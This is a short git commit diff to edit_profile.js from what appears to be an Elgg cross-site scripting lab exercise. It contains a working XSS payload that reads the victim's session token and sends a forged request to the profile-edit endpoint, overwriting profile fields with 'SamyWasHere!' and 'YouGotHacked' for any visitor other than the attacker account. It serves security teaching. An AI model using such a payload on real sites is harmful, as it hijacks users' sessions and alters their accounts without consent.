d32725afed67e2be59a412c1ce6a09dacd817a82
Abdullah Elsayed <abdallah.elsaid25@gmail.com>
2025-01-02 07:15:38 +0200

    Edit message content in edit_profile

--- edit_profile.js
+++ edit_profile.js
@@ -7,7 +7,7 @@ window.onload = function() {
   var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
   
   //Construct the content of your url.
-  var content =`${token}${ts}&name=YouGotHacked&description=SamyWasHere!&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=${guid}`; //FILL IN
+  var content =`${token}${ts}&name=SamyWasHere!&description=YouGotHacked&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=${guid}`; //FILL IN
   var sendurl ="http://www.xsslabelgg.com/action/profile/edit";
   var samyGuid =47; //FILL IN
   if (elgg.session.user.guid != samyGuid)
